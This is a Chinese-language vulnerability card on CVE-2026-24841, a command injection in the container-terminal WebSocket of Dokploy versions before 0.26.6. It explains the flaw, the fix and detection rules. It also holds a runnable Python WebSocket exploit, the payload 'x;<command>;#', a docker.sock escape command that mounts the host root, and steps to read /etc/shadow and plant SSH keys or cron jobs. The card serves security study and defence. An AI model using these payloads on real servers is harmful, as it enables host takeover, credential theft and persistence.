---
id: web-generic-websocket-dokploy-container-terminal-command-injection
title: Dokploy 容器终端 WebSocket 的 containerId/activeWay 直拼 shell：认证用户经 docker.sock 逃逸到宿主机（CVE-2026-24841）
type: scenario
domain: web
path: web/generic/websocket
technique: dokploy-container-terminal-ws-command-injection
aliases:
- CVE-2026-24841
- Dokploy RCE
- docker-container-terminal 命令注入
- containerId 注入
- activeWay 注入
- docker.sock 容器逃逸
tags:
- websocket
- command-injection
- dokploy
- docker
- container-escape
- nodejs
- cve-2026-24841
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: < 0.26.6（0.26.6 修复）
verification:
  verified_by: verifier-V38
  verified_at: '2026-11-05T05:59:40+08:00'
  notes: 已对照原文核对9张图与源码片段、官方PoC、修复方案：CVE-2026-24841、/docker-container-terminal、containerId/activeWay 直拼 conn.exec 与 spawn(shell,-c)、docker.sock 逃逸链、<0.26.6 受影响版本均一致；作者未搭起真实 Dokploy，靶场为自写仿真器（卡内已注明），真实链路依据源码审计+官方CVE描述+修复diff；PoC 未在本机执行；frontmatter 无 sources/source_url，cve 字段为空但 aliases 含 CVE 编号
---

## 一句话结论

Dokploy 0.26.6 之前的容器终端 WebSocket 端点 `/docker-container-terminal` 把查询参数 `containerId` 与 `activeWay` 原样拼进 shell 命令：SSH 分支为 `conn.exec("docker exec -it -w / <containerId> <activeWay>", {pty:true})`，本地分支为 `spawn(shell, ["-c", "docker exec -it -w / <containerId> <activeWay>"])`；经认证的低权限用户只要把 `containerId` 设成 `x;<命令>;#`（`activeWay=sh`），就能在 Dokploy 容器内执行命令，再借助挂载进容器的 `/var/run/docker.sock` 运行 `docker run --rm -v /:/host -i alpine chroot /host bash`，直接获得宿主机 root。

## 原理

- 功能：Dokploy 的“容器终端”允许在 Web 面板里像 `docker exec -it ... /bin/sh` 一样进入容器；服务端入口是 WebSocket 端点 `/docker-container-terminal`，连接时解析 query 参数 `containerId`、`activeWay`，建立后把 WebSocket 数据流绑定到 `docker exec`。
- 缺陷：这两个参数没有做“应该长什么样”的校验或限制。`containerId` 本应是 12–64 位十六进制容器 ID/容器名，`activeWay` 本应是 `sh`/`bash` 等枚举，但代码直接字符串拼接。
- 两条执行分支都中招：
  - SSH 分支：`conn.exec(\`docker exec -it -w / ${containerId} ${activeWay}\`, { pty: true }, ...)`；
  - 本地分支：`const ptyProcess = spawn(shell, ["-c", \`docker exec -it -w / ${containerId} ${activeWay}\`], {})`。
- `spawn(shell, ["-c", "..."] )` 等价于让 shell 解析并执行一整段脚本；`containerId` 中的 `;`、`&&`、`|`、`$()`、反引号都会被 shell 解释，从而截断原始 `docker exec` 并执行攻击者的命令。
- 逃逸链：Dokploy 为管理容器，默认把宿主机的 `/var/run/docker.sock` 挂进自身容器；因此注入命令在 Dokploy 容器内执行 `docker ...` 时，实际是向宿主机 Docker 守护进程发指令。`docker run --rm -v /:/host -i alpine chroot /host bash` 把宿主机根目录挂到新容器 `/host` 并 `chroot` 进去，后续命令直接作用于宿主机文件系统，完成容器隔离逃逸。
- 根因是“用户输入进入 shell 命令字符串 + 进程拥有 docker.sock 高权限”两点叠加：前者提供命令注入，后者把容器内执行放大为宿主机 root。
- 官方修复给出两种思路：① 严格校验 `containerId` 为 `/^[a-f0-9]{12,64}$/i`（治标，未来新增参数仍可能复发）；② 改用数组参数 `spawn('docker', ['exec','-it','-w','/',containerId,activeWay])` 且 `shell:false`，让参数作为整体经 `execvp` 传给 docker，不再被 shell 解析（治本）。

## 触发条件

- 目标 Dokploy 版本 < 0.26.6。
- 攻击者拥有一个低权限登录态（PoC 需要有效 Cookie；属于 Authenticated RCE）。
- `/docker-container-terminal` WebSocket 可达，且 `containerId`/`activeWay` 可控制。
- Dokploy 容器内挂载了宿主机 `/var/run/docker.sock`（默认部署方式），且容器内有 `docker` 客户端（或可调用 Docker API）。
- 目标可出网/有可用的 alpine 镜像，或本地已有镜像；文章逃逸示例依赖 `alpine`。

## 利用步骤

1. 登录 Dokploy 获取低权限会话 Cookie。
2. 连接 WebSocket：`ws(s)://target/docker-container-terminal?containerId=<payload>&activeWay=sh`，payload 形如 `x;id;#`。
3. 从 WebSocket 读取命令输出（循环 `recv`，超时结束），确认命令在 Dokploy 容器内执行。
4. 执行逃逸命令：`docker run --rm -v /:/host -i alpine chroot /host bash`（或直接 `docker run --rm -v /:/host -i alpine cat /host/etc/shadow` 验证）。
5. 在宿主机根命名空间执行 `id`、`cat /etc/shadow`、写 SSH key/计划任务等，完成持久化。
6. 清理容器/镜像与 WebSocket 会话。

## PoC

```python
#!/usr/bin/env python3
# 依据公开 PoC 的最小复现（文章对其逐行分析）
import sys, asyncio
from urllib.parse import quote
import websockets

async def exploit(target, cookie, cmd):
    payload = f"x;{cmd};#"          # 分号截断原 docker exec，# 注释尾部
    uri = f"{target.replace('http','ws')}/docker-container-terminal?containerId={quote(payload)}&activeWay=sh"
    out = ""
    async with websockets.connect(uri, additional_headers={"Cookie": cookie}) as ws:
        while True:
            try:
                out += await asyncio.wait_for(ws.recv(), timeout=2)
            except asyncio.TimeoutError:
                break
    return out

# 用法：python3 poc.py http://TARGET:3000 "cookie=..." "id"
```

```text
服务端实际拼出的命令（本地分支）：
  sh -c "docker exec -it -w / x;id;# sh"
        └──────────────┘ └──┘ └┘
        原始命令被截断   注入命令  注释尾部 activeWay

宿主机逃逸（Dokploy 容器内默认挂载 /var/run/docker.sock）：
  docker run --rm -v /:/host -i alpine chroot /host bash
  # 新容器把宿主机 / 挂到 /host，chroot 后即为宿主机 root 文件系统
```

```text
文章实验说明：
- 作者未能搭起真实 Dokploy（残留数据库导致 DATABASE_URL 冲突），改用自写靶场模拟鉴权与命令执行；
- 官方 PoC 与自写 PoC 均验证通过；不带 session / session 错误时报错；
- 因此真实产品链路来自源码审计 + 官方 CVE 描述 + 修复 diff，PoC 执行于仿真靶场；本卡未在本机执行。
```

## 变体与关联

- 变体（注入字符）：`;` 最直接；`&&`/`||` 依赖前一条命令退出码；`|` 管道；`$()`/反引号命令替换；换行也可截断。
- 变体（分支）：SSH 分支与本地 `spawn(shell, ["-c", ...])` 分支都需同样审计；SSH 分支还受目标 SSH 凭据/网络影响。
- 变体（逃逸载荷）：`docker run -v /:/host ... chroot /host`；也可 `docker run -v /var/run/docker.sock:/sock ...`、`docker exec` 进入特权容器、挂载 `/etc`/`/root` 写 SSH key。
- 关联：[[web-generic-websocket-vite-invoke-fetchmodule-file-read]] 是另一处 WebSocket 端点信任问题；本卡是 WebSocket 参数进入 shell 的命令注入。
- 关联：cloud/container 层的 Docker socket 逃逸卡；本卡前半段是 Web 命令注入，后半段复用 docker.sock 逃逸。
- 边界：升级 0.26.6+；若容器未挂载 docker.sock 或使用 socket 代理只读、且无其它逃逸面，注入仅限 Dokploy 容器内；`containerId` 被严格白名单后注入失效；需要有效登录态。

## 检测与防御

- 请求检测：WebSocket 握手 URL 的 `containerId` 含 `;`、`&&`、`|`、`$(`、反引号、`#`、空格、`/` 等非十六进制字符；`activeWay` 非 `sh`/`bash` 枚举；同一账号短时间内多次连接 `/docker-container-terminal`。
- 主机检测：Dokploy 容器内出现 `docker run ... -v /:/host`、`chroot /host`、`--privileged`；宿主机 Docker 事件出现异常容器创建与根目录挂载；容器终端日志中出现非容器 ID 的参数。
- 修复：升级 Dokploy 0.26.6+；`containerId` 用 `/^[a-f0-9]{12,64}$/i` 严格校验，`activeWay` 用枚举白名单。
- 修复：改用 `spawn('docker', ['exec','-it','-w','/', containerId, activeWay], { shell: false })`，禁止把用户输入拼进 `sh -c`/`conn.exec` 字符串。
- 加固：不要把宿主机 `/var/run/docker.sock` 直接挂进应用容器；使用只读/受限的 Docker socket proxy；Dokploy 与业务容器分离部署，限制容器权限（非 privileged、只读根、最小挂载）；对容器终端功能做管理员级权限与审计。
- 审计：搜索 `spawn(`、`exec(`、`execSync`、`conn.exec` 中带模板字符串的调用；检查所有 `containerId`/`activeWay`/容器名参数是否进入 shell；检查 docker.sock 的挂载与可达性。
